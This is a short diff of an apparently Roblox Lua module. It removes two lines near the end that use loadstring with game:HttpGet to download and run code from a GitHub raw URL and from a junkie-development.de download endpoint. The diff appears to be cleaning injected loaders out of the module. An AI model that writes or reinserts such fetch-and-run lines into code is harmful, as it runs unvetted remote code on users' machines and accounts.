@@ -379,7 +379,5 @@ do warn([[
 
 Configs = Module.Config:load()
 Module.index = __index
-loadstring(game:HttpGet('https://raw.githubusercontent.com/sofziol1fe/Script/main/Packages/Hooked.luau', true))()
-loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/85c73456d1ac18073c051e365dfc21c39d9afbab74b6c49675a8b049d924dbef/download"))()
 
 return Module, Configs
